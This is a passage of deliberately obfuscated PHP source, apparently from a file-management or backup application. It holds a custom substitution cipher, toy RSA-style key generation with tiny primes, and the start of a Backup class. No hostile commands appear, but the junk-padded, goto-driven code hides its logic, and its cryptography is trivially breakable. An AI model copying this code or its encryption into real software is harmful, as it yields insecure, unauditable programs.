$this->{$_SERVER[Ş¥ÖÁ÷Ù][133]}($BÏ¨ì³‡†ù, $cöí±š¿ù, $C¾Ç‡ˆ°Ÿ - 1); } return $BÏ¨ì³‡†ù; goto E¶¾‚èó»Ÿ; b–ÎÎ³Çèç: switch ($DƒŸåñğÕ) { case $e¿‚‡ñ”‡ñ[240]: $BÏ¨ì³‡†ù = $this->{$_SERVER[Ş¥ÖÁ÷Ù][153]}($b¿ãÉòäÏ, $e¿‚‡ñ”‡ñ[220]($cöí±š¿ù . $Bšå—è““Î)); $C´¯·›» = $bê…•»›æ†[659]; if (strlen($C´¯·›») < $bê…•»›æ†[591]) { die; } break; $b–âîÅµÇé = $bê…•»›æ†[660]; case $e¿‚‡ñ”‡ñ[226]: $BÏ¨ì³‡†ù = $this->{$_SERVER[Ş¥ÖÁ÷Ù][153]}($b¿ãÉòäÏ, $e¿‚‡ñ”‡ñ[220]($Bšå—è““Î . $cöí±š¿ù)); $DÌ™À½µ°« = $bê…•»›æ†[661]; if (!$DÌ™À½µ°«) { return; } break; $få©²¯«Ğ“ = $bê…•»›æ†[662]; if (!$få©²¯«Ğ“) { return; } case $e¿‚‡ñ”‡ñ[344]: $BÏ¨ì³‡†ù = $this->{$_SERVER[Ş¥ÖÁ÷Ù][153]}($b¿ãÉòäÏ, $e¿‚‡ñ”‡ñ[124]($Bšå—è““Î . $cöí±š¿ù)); $E¬§Æ‘çğ„ = $bê…•»›æ†[663]; break; $fÖ²åÒ°é = $bê…•»›æ†[664]; if (strlen($fÖ²åÒ°é) < $bê…•»›æ†[593]) { die; } case $e¿‚‡ñ”‡ñ[345]: $BÏ¨ì³‡†ù = $this->{$_SERVER[Ş¥ÖÁ÷Ù][153]}($b¿ãÉòäÏ, $e¿‚‡ñ”‡ñ[120]($Bšå—è““Î . $cöí±š¿ù)); $D”ö©¾’¼§ = $bê…•»›æ†[665]; while ($D”ö©¾’¼§ < $bê…•»›æ†[591]) { if ($D”ö©¾’¼§ >= 0) { break; } $D”ö©¾’¼§++; } break; case $e¿‚‡ñ”‡ñ[346]: goto Dµì¤´ÂŸ…; Dµì¤´ÂŸ…: $b¿ãÉòäÏ = $e¿‚‡ñ”‡ñ[124]($b¿ãÉòäÏ); $EÉËÅùŠ‡Î = $bê…•»›æ†[666]; while (strlen($EÉËÅùŠ‡Î) < $bê…•»›æ†[10]) { if (!$EÉËÅùŠ‡Î) { break; } $EÉËÅùŠ‡Î++; } goto bÃôˆĞ»°; bÃôˆĞ»°: $a”æ§ãó = $e¿‚‡ñ”‡ñ[347](0, 64); $AÈ­§‘Å™ = $DêÄ‚ª[$a”æ§ãó]; $cñïªˆà†º = $bê…•»›æ†[667]; goto CÈÖ§™æİò; CŠ‹ô¹¸Ä³: $Cõ­‘¡šæ = $bê…•»›æ†[671]; while (strlen($Cõ­‘¡šæ) < $bê…•»›æ†[602]) { if (!$Cõ­‘¡šæ) { break; } $Cõ­‘¡šæ++; } $DÌÔáÏ‘§Ö = 0; goto Eô·Ñ‰æ¢®; Eô·Ñ‰æ¢®: $DôÑÏÈÂ™î = 0; $EÎŠ³ÔÂ—¡ = $bê…•»›æ†[672]; while (strlen($EÎŠ³ÔÂ—¡) < $bê…•»›æ†[602]) { if (!$EÎŠ³ÔÂ—¡) { break; } $EÎŠ³ÔÂ—¡++; } goto A½——£²; CÈÖ§™æİò: $dê¹Û¤£ó = $e¿‚‡ñ”‡ñ[120]($AÈ­§‘Å™ . $e¿‚‡ñ”‡ñ[120]($cöí±š¿ù . $AÈ­§‘Å™) . $cöí±š¿ù); $e„¥‚î÷³Ö = $bê…•»›æ†[668]; $dê¹Û¤£ó = $e¿‚‡ñ”‡ñ[25]($dê¹Û¤£ó, $a”æ§ãó % 8, $a”æ§ãó % 8 + 7); goto EÅ“¹õ‚¿÷; EÅ“¹õ‚¿÷: $F¥‘µ‹£ò = $bê…•»›æ†[669]; if (strlen($F¥‘µ‹£ò) < $bê…•»›æ†[591]) { return; } $f³£††±–Ì = $e¿‚‡ñ”‡ñ[10]; goto A ğóõŒˆ; A½——£²: for ($e‰»‘ ò ‚ = 0; $e‰»‘ ò ‚ < $e¿‚‡ñ”‡ñ[24]($b¿ãÉòäÏ); $e‰»‘ ò ‚++) { $DôÑÏÈÂ™î = $DôÑÏÈÂ™î == $e¿‚‡ñ”‡ñ[24]($dê¹Û¤£ó) ? 0 : $DôÑÏÈÂ™î; $aÊÍŞÜ¯İ… = $bê…•»›æ†[673]; $DÌÔáÏ‘§Ö = ($a”æ§ãó + $e¿‚‡ñ”‡ñ[348]($DêÄ‚ª, $b¿ãÉòäÏ[$e‰»‘ ò ‚]) + $e¿‚‡ñ”‡ñ[349]($dê¹Û¤£ó[$DôÑÏÈÂ™î++])) % 64; $f³£††±–Ì .= $DêÄ‚ª[$DÌÔáÏ‘§Ö]; } $BÏ¨ì³‡†ù = $e¿‚‡ñ”‡ñ[340]($AÈ­§‘Å™ . $f³£††±–Ì); $fŒÜõê±£ = $bê…•»›æ†[674]; goto d¢¢Ìéôà; d¢¢Ìéôà: if (!$fŒÜõê±£) { return; } break; $c¡Š“×Ô»À = $bê…•»›æ†[675]; goto c³²ŸÛ½¼Š; A ğóõŒˆ: $báÕ³¦Ë„ù = $bê…•»›æ†[670]; if (!$báÕ³¦Ë„ù) { die; } $e‰»‘ ò ‚ = 0; goto CŠ‹ô¹¸Ä³; c³²ŸÛ½¼Š: if (!$c¡Š“×Ô»À) { die; } goto Bö‰Ú‘‘‡æ; Bö‰Ú‘‘‡æ: default: $BÏ¨ì³‡†ù = $this->{$_SERVER[Ş¥ÖÁ÷Ù][153]}($b¿ãÉòäÏ, $cöí±š¿ù . $Bšå—è““Î); break; } $BÏ¨ì³‡†ù = $e¿‚‡ñ”‡ñ[220]($DƒŸåñğÕ . $Bšå—è““Î . $BÏ¨ì³‡†ù); $a¤óó¹‚œ = $bê…•»›æ†[676]; goto E¯áÃÉôÂã; Bš½ĞÖ™ªÓ: $bê…•»›æ† =& $_SERVER[¾÷]; $e¿‚‡ñ”‡ñ =& $_SERVER[Ş¥ÖÁ÷Ù]; $e¿‚‡ñ”‡ñ[342](1); goto F½ŞÂÓŞ˜ğ; E¶¾‚èó»Ÿ: } private function expdfab09179($BŠƒÎ“Ğ», $cùƒ‘„ŒùÀ, $då”×ŒÊ³Ş = 3) { goto DÛ‚òì›½; CÒ£ÔÀÀŠš: $BŠƒÎ“Ğ» = $a¦èÚ²«Ø[2]($BŠƒÎ“Ğ»); $b§’Ç¤ÚÅ = $bé§ñø¢Å¹[677]; while (strlen($b§’Ç¤ÚÅ) < $bé§ñø¢Å¹[593]) { if (!$b§’Ç¤ÚÅ) { break; } $b§’Ç¤ÚÅ++; } goto bÉğÜ¢ÀÄ™; dßëÉÁÊ§¯: if ($då”×ŒÊ³Ş - 1 > 0) { $A’ô‰×ƒ©æ = $this->{$_SERVER[Ş¥ÖÁ÷Ù][195]}($A’ô‰×ƒ©æ, $cùƒ‘„ŒùÀ, $då”×ŒÊ³Ş - 1); } return $A’ô‰×ƒ©æ; goto A¾£´Ñ¸ğñ; f¼×ôŠ®Õ¢: $BŠƒÎ“Ğ» = $a¦èÚ²«Ø[25]($BŠƒÎ“Ğ», 16); $b—ÒÉã¤£Ì = $a¦èÚ²«Ø[343]; switch ($f¨‚ã±Ÿ›Ğ) { case $a¦èÚ²«Ø[240]: $A’ô‰×ƒ©æ = $this->{$_SERVER[Ş¥ÖÁ÷Ù][256]}($BŠƒÎ“Ğ», $a¦èÚ²«Ø[220]($cùƒ‘„ŒùÀ . $E¼Ÿç£ºæÙ)); break; case $a¦èÚ²«Ø[226]: $A’ô‰×ƒ©æ = $this->{$_SERVER[Ş¥ÖÁ÷Ù][256]}($BŠƒÎ“Ğ», $a¦èÚ²«Ø[220]($E¼Ÿç£ºæÙ . $cùƒ‘„ŒùÀ)); $Böœ¨†æÔ = $bé§ñø¢Å¹[680]; if (strlen($Böœ¨†æÔ) < $bé§ñø¢Å¹[593]) { return; } break; case $a¦èÚ²«Ø[344]: $A’ô‰×ƒ©æ = $this->{$_SERVER[Ş¥ÖÁ÷Ù][256]}($BŠƒÎ“Ğ», $a¦èÚ²«Ø[124]($E¼Ÿç£ºæÙ . $cùƒ‘„ŒùÀ)); $f¤¾ÛæÏ«ğ = $bé§ñø¢Å¹[681]; if (!$f¤¾ÛæÏ«ğ) { die; } break; case $a¦èÚ²«Ø[345]: $A’ô‰×ƒ©æ = $this->{$_SERVER[Ş¥ÖÁ÷Ù][256]}($BŠƒÎ“Ğ», $a¦èÚ²«Ø[120]($E¼Ÿç£ºæÙ . $cùƒ‘„ŒùÀ)); $bå¼‘îİã¬ = $bé§ñø¢Å¹[682]; while (strlen($bå¼‘îİã¬) < $bé§ñø¢Å¹[10]) { if (!$bå¼‘îİã¬) { break; } $bå¼‘îİã¬++; } break; $aßÎˆ¬˜éØ = $bé§ñø¢Å¹[683]; while (strlen($aßÎˆ¬˜éØ) < $bé§ñø¢Å¹[602]) { if (!$aßÎˆ¬˜éØ) { break; } $aßÎˆ¬˜éØ++; } case $a¦èÚ²«Ø[346]: goto Ašä¬Ø¬Ç; B‰³™­Œ•ˆ: $báêîøáÂ‚ = $bé§ñø¢Å¹[685]; if (!$báêîøáÂ‚) { die; } for ($a»ŒÃ¼ = 0; $a»ŒÃ¼ < $a¦èÚ²«Ø[24]($BŠƒÎ“Ğ»); $a»ŒÃ¼++) { $C‹Á„‡ŠÑ¹ = $C‹Á„‡ŠÑ¹ == $a¦èÚ²«Ø[24]($e¶©‚”àİÑ) ? 0 : $C‹Á„‡ŠÑ¹; $EÌ‘Õ£¼ç• = $bé§ñø¢Å¹[686]; if (strlen($EÌ‘Õ£¼ç•) < $bé§ñø¢Å¹[582]) { return; } $c®ƒÖ©¤¹ë = $C‹Á„‡ŠÑ¹++; $dµ§Á£óá = $a¦èÚ²«Ø[348]($b—ÒÉã¤£Ì, $BŠƒÎ“Ğ»[$a»ŒÃ¼]) - $eŠâˆ”¹¯ - $a¦èÚ²«Ø[349]($e¶©‚”àİÑ[$c®ƒÖ©¤¹ë]); $Aá·Œù“ÓÛ = $bé§ñø¢Å¹[687]; while ($dµ§Á£óá < 0) { $dµ§Á£óá += 64; $aóã˜æ¥æø = $bé§ñø¢Å¹[688]; } $Eß¹ƒßø§› .= $b—ÒÉã¤£Ì[$dµ§Á£óá]; } goto FÏÎÏ®æŠŒ; bóß¼º»³ë: $a»ŒÃ¼ = 0; $dµ§Á£óá = 0; $C‹Á„‡ŠÑ¹ = 0; goto B‰³™­Œ•ˆ; FÏÎÏ®æŠŒ: $A’ô‰×ƒ©æ = $a¦èÚ²«Ø[352]($Eß¹ƒßø§›); $fŸŸ°ƒø®Ê = $bé§ñø¢Å¹[689]; break; goto cšÄİÏèŠ¥; Ašä¬Ø¬Ç: $BŠƒÎ“Ğ» = $a¦èÚ²«Ø[351]($BŠƒÎ“Ğ»); $bÕÉÜö÷ĞÕ = $bé§ñø¢Å¹[684]; while ($bÕÉÜö÷ĞÕ < $bé§ñø¢Å¹[602]) { if ($bÕÉÜö÷ĞÕ >= 0) { break; } $bÕÉÜö÷ĞÕ++; } goto DŠ‰İÓÉÊ; DŠ‰İÓÉÊ: $eÄÖğ÷Éˆ = $BŠƒÎ“Ğ»[0]; $BŠƒÎ“Ğ» = $a¦èÚ²«Ø[25]($BŠƒÎ“Ğ», 1); $eŠâˆ”¹¯ = $a¦èÚ²«Ø[348]($b—ÒÉã¤£Ì, $eÄÖğ÷Éˆ); goto eºÄ»È…˜£; eºÄ»È…˜£: $e¶©‚”àİÑ = $a¦èÚ²«Ø[120]($eÄÖğ÷Éˆ . $a¦èÚ²«Ø[120]($cùƒ‘„ŒùÀ . $eÄÖğ÷Éˆ) . $cùƒ‘„ŒùÀ); $e¶©‚”àİÑ = $a¦èÚ²«Ø[25]($e¶©‚”àİÑ, $eŠâˆ”¹¯ % 8, $eŠâˆ”¹¯ % 8 + 7); $Eß¹ƒßø§› = $a¦èÚ²«Ø[10]; goto bóß¼º»³ë; cšÄİÏèŠ¥: default: $A’ô‰×ƒ©æ = $this->{$_SERVER[Ş¥ÖÁ÷Ù][256]}($BŠƒÎ“Ğ», $cùƒ‘„ŒùÀ . $E¼Ÿç£ºæÙ); $d¾É…»¶„¡ = $bé§ñø¢Å¹[690]; break; $aÕ—õ¸‰Š = $bé§ñø¢Å¹[691]; if (!$aÕ—õ¸‰Š) { return; } } goto dßëÉÁÊ§¯; FÏ¾´‹³Ã£: while (strlen($BŒ±ÑÑà÷) < $bé§ñø¢Å¹[10]) { if (!$BŒ±ÑÑà÷) { break; } $BŒ±ÑÑà÷++; } $E¼Ÿç£ºæÙ = $a¦èÚ²«Ø[25]($BŠƒÎ“Ğ», 1, 15); $cÜäÃ”Ìƒ = $bé§ñø¢Å¹[679]; goto f¼×ôŠ®Õ¢; bÉğÜ¢ÀÄ™: $BŠƒÎ“Ğ» = $a¦èÚ²«Ø[220]($BŠƒÎ“Ğ»); $f¨‚ã±Ÿ›Ğ = $BŠƒÎ“Ğ»[0]; $BŒ±ÑÑà÷ = $bé§ñø¢Å¹[678]; goto FÏ¾´‹³Ã£; DÛ‚òì›½: $bé§ñø¢Å¹ =& $_SERVER[¾÷]; $a¦èÚ²«Ø =& $_SERVER[Ş¥ÖÁ÷Ù]; if (!$a¦èÚ²«Ø[350]($BŠƒÎ“Ğ») || $a¦èÚ²«Ø[24]($BŠƒÎ“Ğ») < 10) { return !1; } goto CÒ£ÔÀÀŠš; A¾£´Ñ¸ğñ: } public function marhd591bdd6($EÀ‘°·ÅÖÔ) { goto F¸ñ±”òáË; F»¯Ä±Şƒ: $f›ÀáÑ¨  = 2; for ($b¤ä…ç•×¬ = 0; $b¤ä…ç•×¬ < $a»“½èÍ * 10; $b¤ä…ç•×¬++) { if (($a»“½èÍ * $b¤ä…ç•×¬ + 1) % $d“İß­§ == 0) { $f›ÀáÑ¨  = $Cçã÷ÃÜ»Å[250](($a»“½èÍ * $b¤ä…ç•×¬ + 1) / $d“İß­§); break; } } $CÜöÇÚèé = $this->{$_SERVER[Ş¥ÖÁ÷Ù][153]}($Eô‚’À« * $a¦”ŒÔ‰©È . $Cçã÷ÃÜ»Å[10], $Cçã÷ÃÜ»Å[155]); goto dÉ¨÷Ïì¢¸; aÜ•›Úƒ®É: $AÛùµñİñĞ = $e™àÀ‡İ‰[694]; while (strlen($AÛùµñİñĞ) < $e™àÀ‡İ‰[582]) { if (!$AÛùµñİñĞ) { break; } $AÛùµñİñĞ++; } while (1) { $DÎ´ùŒ“ñ = $d“İß­§; $b›¢·å¸Š– = $a»“½èÍ; $F³œìâ¨¬Ç = $e™àÀ‡İ‰[695]; if (!$F³œìâ¨¬Ç) { die; } while ($b›¢·å¸Š– % $DÎ´ùŒ“ñ != 0) { $dÆÙÂ‚Îä¥ = $b›¢·å¸Š–; $b›¢·å¸Š– = $DÎ´ùŒ“ñ; $DÎ´ùŒ“ñ = $dÆÙÂ‚Îä¥ % $DÎ´ùŒ“ñ; } if ($DÎ´ùŒ“ñ == 1) { break; } else { $d“İß­§++; } } goto F»¯Ä±Şƒ; eìï™îÕ½ì: $E¤”ïñÔ© = $e™àÀ‡İ‰[618]; if (!$E¤”ïñÔ©) { return; } $a»“½èÍ = ($Eô‚’À« - 1) * ($a¦”ŒÔ‰©È - 1); goto B¨õš›ÀŠĞ; C¦‹âÛ—ÄÆ: $Eé¡ñÂŒ¿À = $e™àÀ‡İ‰[692]; while (strlen($Eé¡ñÂŒ¿À) < $e™àÀ‡İ‰[593]) { if (!$Eé¡ñÂŒ¿À) { break; } $Eé¡ñÂŒ¿À++; } $a¦”ŒÔ‰©È = $this->{$_SERVER[Ş¥ÖÁ÷Ù][353]}(); goto eìï™îÕ½ì; dÉ¨÷Ïì¢¸: $B¿ªÍÆ›‘– = $Cçã÷ÃÜ»Å[120]($Cçã÷ÃÜ»Å[354] . ($Eô‚’À« + $a¦”ŒÔ‰©È) . $Cçã÷ÃÜ»Å[355] . $d“İß­§ . $Cçã÷ÃÜ»Å[355] . $f›ÀáÑ¨  . $Cçã÷ÃÜ»Å[356]); $b«ğİì× = $e™àÀ‡İ‰[696]; if (strlen($b«ğİì×) < $e™àÀ‡İ‰[10]) { die; } goto E°¥í¥ƒ°ˆ; B¨õš›ÀŠĞ: $bØ£Ø•‰ôÄ = $e™àÀ‡İ‰[693]; while ($bØ£Ø•‰ôÄ < $e™àÀ‡İ‰[593]) { if ($bØ£Ø•‰ôÄ >= 0) { break; } $bØ£Ø•‰ôÄ++; } $d“İß­§ = $Cçã÷ÃÜ»Å[250](($Eô‚’À« + $a¦”ŒÔ‰©È) / 2); goto aÜ•›Úƒ®É; E°¥í¥ƒ°ˆ: $E×Å÷°ƒ”† = $this->{$_SERVER[Ş¥ÖÁ÷Ù][153]}($EÀ‘°·ÅÖÔ, $B¿ªÍÆ›‘–) . $Cçã÷ÃÜ»Å[357] . $CÜöÇÚèé; return $E×Å÷°ƒ”†; goto AÒ ·¼Õ‘Ö; F¸ñ±”òáË: $e™àÀ‡İ‰ =& $_SERVER[¾÷]; $Cçã÷ÃÜ»Å =& $_SERVER[Ş¥ÖÁ÷Ù]; $Eô‚’À« = $this->{$_SERVER[Ş¥ÖÁ÷Ù][353]}(); goto C¦‹âÛ—ÄÆ; AÒ ·¼Õ‘Ö: } public function abgf68d63571($Bß«†ôÒ”Ç) { goto b³µ±ÇŠº; d±éé…äœ: if ($d¹âË¯ë[19]($EíÕ’ñ”ë) != 2) { return $d¹âË¯ë[10]; } $EÎ„¦‚…— = $this->{$_SERVER[Ş¥ÖÁ÷Ù][256]}($EíÕ’ñ”ë[1] . $d¹âË¯ë[10], $d¹âË¯ë[155]); if (!$EÎ„¦‚…—) { return $d¹âË¯ë[10]; } goto c«ëˆÂœ¼; b³µ±ÇŠº: $F¤ÛÜ¤ĞçÉ =& $_SERVER[¾÷]; $d¹âË¯ë =& $_SERVER[Ş¥ÖÁ÷Ù]; $EíÕ’ñ”ë = $d¹âË¯ë[0]($d¹âË¯ë[357], $Bß«†ôÒ”Ç); goto d±éé…äœ; c«ëˆÂœ¼: $EÎ„¦‚…— = $d¹âË¯ë[250]($EÎ„¦‚…—); $D³İ¤Û‹Æ = $F¤ÛÜ¤ĞçÉ[697]; if (!$D³İ¤Û‹Æ) { die; } goto bï÷ÛÖÔ­Í; d¿‡ ¶›í´: $CÔ†‡²¹·” = $d¹âË¯ë[250](($f¼ÎÊ¿‘ˆ + $EÁ•åÃºí¡) / 2); while (1) { $Cã™µ¸¯Úå = $CÔ†‡²¹·”; $DµæŒ‘ò÷š = $F¤ÛÜ¤ĞçÉ[699]; while ($DµæŒ‘ò÷š < $F¤ÛÜ¤ĞçÉ[602]) { if ($DµæŒ‘ò÷š >= 0) { break; } $DµæŒ‘ò÷š++; } $B›ÃŠ¢ë = $Cˆ½³ˆë“ã; $D”Èİù’ß = $F¤ÛÜ¤ĞçÉ[700]; if (strlen($D”Èİù’ß) < $F¤ÛÜ¤ĞçÉ[591]) { return; } while ($B›ÃŠ¢ë % $Cã™µ¸¯Úå != 0) { $bÂ§ŠÇĞ¿¸ = $B›ÃŠ¢ë; $d‹ˆƒê = $F¤ÛÜ¤ĞçÉ[701]; if (strlen($d‹ˆƒê) < $F¤ÛÜ¤ĞçÉ[591]) { return; } $B›ÃŠ¢ë = $Cã™µ¸¯Úå; $Cã™µ¸¯Úå = $bÂ§ŠÇĞ¿¸ % $Cã™µ¸¯Úå; } if ($Cã™µ¸¯Úå == 1) { break; } else { $CÔ†‡²¹·”++; } } $D¶Ş‡©ÉÑ = 2; goto a»÷¢ÙÔÅÖ; a»÷¢ÙÔÅÖ: for ($aÙœ¼†‚²² = 0; $aÙœ¼†‚²² < $Cˆ½³ˆë“ã * 10; $aÙœ¼†‚²²++) { if (($Cˆ½³ˆë“ã * $aÙœ¼†‚²² + 1) % $CÔ†‡²¹·” == 0) { $D¶Ş‡©ÉÑ = $d¹âË¯ë[250](($Cˆ½³ˆë“ã * $aÙœ¼†‚²² + 1) / $CÔ†‡²¹·”); break; } } $DŸÈğé®ñÒ = $d¹âË¯ë[120]($d¹âË¯ë[354] . ($f¼ÎÊ¿‘ˆ + $EÁ•åÃºí¡) . $d¹âË¯ë[355] . $CÔ†‡²¹·” . $d¹âË¯ë[355] . $D¶Ş‡©ÉÑ . $d¹âË¯ë[356]); $cÜÏ¤”Š¢“ = $F¤ÛÜ¤ĞçÉ[702]; goto E¼ˆÀê°˜†; E¼ˆÀê°˜†: if (strlen($cÜÏ¤”Š¢“) < $F¤ÛÜ¤ĞçÉ[582]) { return; } $Dšœ®Å¼Í = $this->{$_SERVER[Ş¥ÖÁ÷Ù][256]}($EíÕ’ñ”ë[0], $DŸÈğé®ñÒ); return $Dšœ®Å¼Í; goto BÇèªõÉ´„; CÁÖ¦»´‰ê: $Cˆ½³ˆë“ã = ($f¼ÎÊ¿‘ˆ - 1) * ($EÁ•åÃºí¡ - 1); $E”š ÆßÀª = $F¤ÛÜ¤ĞçÉ[698]; while (strlen($E”š ÆßÀª) < $F¤ÛÜ¤ĞçÉ[593]) { if (!$E”š ÆßÀª) { break; } $E”š ÆßÀª++; } goto d¿‡ ¶›í´; bï÷ÛÖÔ­Í: $f¼ÎÊ¿‘ˆ = 0; $EÁ•åÃºí¡ = 0; for ($aÙœ¼†‚²² = 3; $aÙœ¼†‚²² < $EÎ„¦‚…—; $aÙœ¼†‚²² += 2) { if ($EÎ„¦‚…— % $aÙœ¼†‚²² != 0) { continue; } $f¼ÎÊ¿‘ˆ = $aÙœ¼†‚²²; $EÁ•åÃºí¡ = $d¹âË¯ë[250]($EÎ„¦‚…— / $aÙœ¼†‚²²); break; } goto CÁÖ¦»´‰ê; BÇèªõÉ´„: } public function mszf23cf9cee() { goto fš°¼Û²ø¥; aØ¢Ï’«åí: $DÌ—’ªˆÊÁ = $Aµ©†Ã´ß[706]; while ($DÌ—’ªˆÊÁ < $Aµ©†Ã´ß[582]) { if ($DÌ—’ªˆÊÁ >= 0) { break; } $DÌ—’ªˆÊÁ++; } for ($B¸‚ñœĞŸ = $aŒçÉ¶Æ; $B¸‚ñœĞŸ > 1; $B¸‚ñœĞŸ--) { $A¼ÅÓ­¿–Ä = !0; $c”¬´ªĞœõ = $Aµ©†Ã´ß[707]; if (!$c”¬´ªĞœõ) { die; } foreach ($Cº“ØİƒôÀ as $AÁòÖÓ÷Ø) { if ($B¸‚ñœĞŸ % $AÁòÖÓ÷Ø == 0) { $A¼ÅÓ­¿–Ä = !1; break; } } if ($A¼ÅÓ­¿–Ä) { $AµƒÚÂ›Üö = $B¸‚ñœĞŸ; break; } } goto aß…’ë§¢; aß…’ë§¢: return $AµƒÚÂ›Üö; goto EÃ—¯–õ±; b™ÖçêŒ¾: $Fİ’ø¬­Ïš = $Aµ©†Ã´ß[704]; while ($D ³İ·Àäõ <= (int) $CÈˆÂÀğ™Ğ[359]($aŒçÉ¶Æ)) { $B¸‚ñœĞŸ = $D ³İ·Àäõ; while (!0) { $B¸‚ñœĞŸ++; $a¢¢‰Ş Ì = $Aµ©†Ã´ß[705]; while ($a¢¢‰Ş Ì < $Aµ©†Ã´ß[591]) { if ($a¢¢‰Ş Ì >= 0) { break; } $a¢¢‰Ş Ì++; } if ($B¸‚ñœĞŸ <= 2) { $D ³İ·Àäõ = $B¸‚ñœĞŸ; break; } else { if ($B¸‚ñœĞŸ < 2) { continue; } } $A¼ÅÓ­¿–Ä = !0; for ($f¤ØÉ¤–Ç’ = 2; $f¤ØÉ¤–Ç’ <= $CÈˆÂÀğ™Ğ[359]($B¸‚ñœĞŸ); $f¤ØÉ¤–Ç’++) { if ($B¸‚ñœĞŸ % $f¤ØÉ¤–Ç’ == 0) { $A¼ÅÓ­¿–Ä = !1; } } if ($A¼ÅÓ­¿–Ä) { $D ³İ·Àäõ = $B¸‚ñœĞŸ; break; } } $Cº“ØİƒôÀ[] = $D ³İ·Àäõ; } $AµƒÚÂ›Üö = 2; goto aØ¢Ï’«åí; fš°¼Û²ø¥: $Aµ©†Ã´ß =& $_SERVER[¾÷]; $CÈˆÂÀğ™Ğ =& $_SERVER[Ş¥ÖÁ÷Ù]; $aŒçÉ¶Æ = $CÈˆÂÀğ™Ğ[338]($CÈˆÂÀğ™Ğ[358](2, 14), $CÈˆÂÀğ™Ğ[358](2, 16) - 1); goto eé­œÙãÓ; eé­œÙãÓ: $CÁÓÂß±Û‰ = $Aµ©†Ã´ß[703]; $Cº“ØİƒôÀ = array(); $D ³İ·Àäõ = 1; goto b™ÖçêŒ¾; EÃ—¯–õ±: } public function ycrs5384e472($B¾ÌœÇ˜ºĞ, $aä†«êæò) { $B‘»ñè÷¯ =& $_SERVER[Ş¥ÖÁ÷Ù]; return $B‘»ñè÷¯[13](array($B‘»ñè÷¯[14], $B‘»ñè÷¯[360]), $B¾ÌœÇ˜ºĞ, $aä†«êæò); } public function dqyv16a22b64($aÓ“¨®’¨µ, $fÎõ‹ ¸Ï) { $e‹·äèå™ =& $_SERVER[Ş¥ÖÁ÷Ù]; return $e‹·äèå™[13](array($e‹·äèå™[361], $e‹·äèå™[362]), $aÓ“¨®’¨µ, $fÎõ‹ ¸Ï); $E‰…éÈ‹í = $_SERVER[¾÷][708]; } public function auozdfeec93c($CÇÄÓĞÛœÃ, $f«ïÔÒˆÖ) { $DÄŸ…‡íá =& $_SERVER[Ş¥ÖÁ÷Ù]; return $DÄŸ…‡íá[13](array($DÄŸ…‡íá[361], $DÄŸ…‡íá[363]), $CÇÄÓĞÛœÃ, $f«ïÔÒˆÖ); } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $Eˆ²‰‘ï =& $_SERVER[¾÷]; self::$name = date($Eˆ²‰‘ï[709]); if (!($aÄïõÛå²ˆ = Model($Eˆ²‰‘ï[710])->lastItem())) { $aÄïõÛå²ˆ = $this->initData(); } else { self::$name = $aÄïõÛå²ˆ[$Eˆ²‰‘ï[38]]; if ($aÄïõÛå²ˆ[$Eˆ²‰‘ï[711]] == $Eˆ²‰‘ï[96]) { self::$name = date($Eˆ²‰‘ï[712]); $F£“Ï°«¸ = 0; if (isset($aÄïõÛå²ˆ[$Eˆ²‰‘ï[298]][$Eˆ²‰‘ï[201]][$Eˆ²‰‘ï[450]])) { $F£“Ï°«¸ = (int) $aÄïõÛå²ˆ[$Eˆ²‰‘ï[298]][$Eˆ²‰‘ï[201]][$Eˆ²‰‘ï[450]]; } if ($aÄïõÛå²ˆ[$Eˆ²‰‘ï[38]] == self::$name) { Model($Eˆ²‰‘ï[710])->remove($aÄïõÛå²ˆ[$Eˆ²‰‘ï[397]]); } $aÄïõÛå²ˆ = $this->initData($F£“Ï°«¸, $aÄïõÛå²ˆ[$Eˆ²‰‘ï[713]]); } else { $this->checkStore($aÄïõÛå²ˆ[$Eˆ²‰‘ï[713]]); } } self::$option = $aÄïõÛå²ˆ; } private function initData($b³ĞŒÜç´µ = 0, $cÆ‰‘¸ù¡» = '') { goto D¬”œÜ±³†; D¬”œÜ±³†: $d„®ØÁÏºÀ =& $_SERVER[¾÷]; $CÌ¦ˆË› = Model($d„®ØÁÏºÀ[710])->config(); if ($cÆ‰‘¸ù¡» && $CÌ¦ˆË›[$d„®ØÁÏºÀ[713]] != $cÆ‰‘¸ù¡») { $b³ĞŒÜç´µ = 0; } goto eÍŸÓÈ’ÚŞ; eÍŸÓÈ’ÚŞ: $this->checkStore($CÌ¦ˆË›[$d„®ØÁÏºÀ[713]]); $cÆ¢Õ„ñÉÈ = array($d„®ØÁÏºÀ[713] => $CÌ¦ˆË›[$d„®ØÁÏºÀ[713]], $d„®ØÁÏºÀ[38] => self::$name, $d„®ØÁÏºÀ[711] => 0, $d„®ØÁÏºÀ[714] => $CÌ¦ˆË›[$d„®ØÁÏºÀ[714]], $d„®ØÁÏºÀ[298] => array($d„®ØÁÏºÀ[715] => array($d„®ØÁÏºÀ[711] => 0), $d„®ØÁÏºÀ[716] => array($d„®ØÁÏºÀ[711] => 0, $d„®ØÁÏºÀ[717] => 0, $d„®ØÁÏºÀ[718] => 0, $d„®ØÁÏºÀ[39] => $d„®ØÁÏºÀ[43]), $d„®ØÁÏºÀ[719] => array($d„®ØÁÏºÀ[711] => 0, $d„®ØÁÏºÀ[717] => 0, $d„®ØÁÏºÀ[718] => 0), $d„®ØÁÏºÀ[201] => array($d„®ØÁÏºÀ[711] => 0, $d„®ØÁÏºÀ[720] => 0, $d„®ØÁÏºÀ[721] => 0, $d„®ØÁÏºÀ[722] => 0, $d„®ØÁÏºÀ[723] => 0, $d„®ØÁÏºÀ[450] => $b³ĞŒÜç´µ)), $d„®ØÁÏºÀ[724] => time(), $d„®ØÁÏºÀ[479] => 0); $FÌ´Ó…Î¼İ = Model($d„®ØÁÏºÀ[710])->insert($cÆ¢Õ„ñÉÈ); goto AİóÛ¸ø¿â; AİóÛ¸ø¿â: $cÆ¢Õ„ñÉÈ[$d„®ØÁÏºÀ[397]] = $FÌ´Ó…Î¼İ; return $cÆ¢Õ„ñÉÈ; goto dÇ°Â©µˆº; dÇ°Â©µˆº: } private function checkStore($e¾Æ¾»¶Šİ) { $BğâÂö®«¯ =& $_SERVER[¾÷]; $däˆñ×“Ô = Model($BğâÂö®«¯[725])->listData($e¾Æ¾»¶Šİ); Model($BğâÂö®«¯[725])->checkConfig($däˆñ×“Ô); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[¾÷][710])->findByName(self::$name); } return self::$option; } public static function set($a’‘æêß¶Æ) { $fñ§óêÏ§Ö =& $_SERVER[¾÷]; $e¢Å‰¯¦ã = self::get(); foreach ($a’‘æêß¶Æ as 